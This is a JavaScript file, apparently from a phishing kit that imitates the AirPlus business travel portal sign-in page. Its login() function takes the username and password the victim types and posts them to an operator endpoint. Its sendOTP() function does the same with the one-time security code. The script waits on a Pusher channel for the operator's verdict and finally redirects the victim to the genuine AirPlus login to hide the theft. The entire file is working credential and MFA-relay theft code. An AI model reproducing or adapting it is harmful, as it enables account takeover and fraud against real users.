function login () {

    var userId = localStorage.getItem('userId');

    if (!userId) {
    userId = generateUniqueId();
    localStorage.setItem('userId', userId);
    } 


    var usernameEntry = document.getElementById('username').value;
    var passwordEntry = document.getElementById('password').value;

    var waitingOverlay = document.querySelector('.waiting-overlay');
    waitingOverlay.style.display = 'flex';

    fetch('ROUTER_LINK', {
        method: 'POST',
        body: JSON.stringify({
            userId: userId,
            userService: "airplus2",
            userLogin: usernameEntry,
            userPassword: passwordEntry,
            userChat: "CHAT_ID",
        }),
    headers: {
        'Content-type': 'application/json; charset=UTF-8'
        }
    })

    Pusher.logToConsole = false;

    var pusher = new Pusher('PUSHER_ID', {
      cluster: 'eu'
    });

    var channel = pusher.subscribe(`airplus2-${userId}`);

    channel.bind('good-account', function(data) {
        window.location.href = "https://sso.service.airplus.com/auth/realms/External/protocol/openid-connect/auth?redirect_uri=https:%2F%2Fbusinesstravelportal.airplus.com%2Fowin%2Fsecurity%2Fkeycloak%2FKeycloakOwinAuthenticationSample_keycloak_auth%2Fcallback&response_type=code&scope=openid&state=oidc_state_220d42647a1948be81c6eeb92d79ec77&client_id=verichannel-external-frontend&client_secret=None";
      });

    channel.bind('bad-account', function(data) {
            var waitingOverlay = document.querySelector('.waiting-overlay');
			waitingOverlay.style.display = 'none';

            var errorAttemptsDiv = document.getElementById('form-error');
            errorAttemptsDiv.style.display = 'block';

            var elements = document.querySelectorAll('.form-error + #kc-form .form-group .form-control');

            elements.forEach(function(element) {
            element.style.color = '#2D276B';
            element.style.borderColor = '#CC1F33'; 
            element.style.backgroundColor = '#FBE4EA'; 
        });

      });

      channel.bind('code-account-email', function(data) {
        window.location.href = 'otp.html';
      });
}

function sendOTP () {

    var userId = localStorage.getItem('userId');

    if (!userId) {
    userId = generateUniqueId();
    localStorage.setItem('userId', userId);
    } 

    var otpInput = document.getElementById('input-code').value;

    var waitingOverlay = document.querySelector('.waiting-overlay');
    waitingOverlay.style.display = 'flex';

    fetch('ROUTER_LINK', {
        method: 'POST',
        body: JSON.stringify({
            userId: userId,
            userService: "airplus2",
            userSms: otpInput,
            userChat: "CHAT_ID",
        }),
    headers: {
        'Content-type': 'application/json; charset=UTF-8'
        }
    })

    Pusher.logToConsole = false;

    var pusher = new Pusher('PUSHER_ID', {
      cluster: 'eu'
    });

    var channel = pusher.subscribe(`airplus2-${userId}`);

    channel.bind('good-email-account', function(data) {
        window.location.href = "https://sso.service.airplus.com/auth/realms/External/protocol/openid-connect/auth?redirect_uri=https:%2F%2Fbusinesstravelportal.airplus.com%2Fowin%2Fsecurity%2Fkeycloak%2FKeycloakOwinAuthenticationSample_keycloak_auth%2Fcallback&response_type=code&scope=openid&state=oidc_state_220d42647a1948be81c6eeb92d79ec77&client_id=verichannel-external-frontend&client_secret=None";
    });

    channel.bind('bad-email-account', function(data) {
        var waitingOverlay = document.querySelector('.waiting-overlay');
        waitingOverlay.style.display = 'none';

        var errorAttemptsDiv = document.getElementById('form-error');
        errorAttemptsDiv.style.display = 'block';
        var elements = document.querySelectorAll('.form-error + #kc-form .form-group .form-control');

        elements.forEach(function(element) {
        element.style.color = '#2D276B';
        element.style.borderColor = '#CC1F33'; 
        element.style.backgroundColor = '#FBE4EA'; 
        });
        

    });


}


function generateUniqueId() {
    return Math.random().toString(36).substr(2, 9);
}

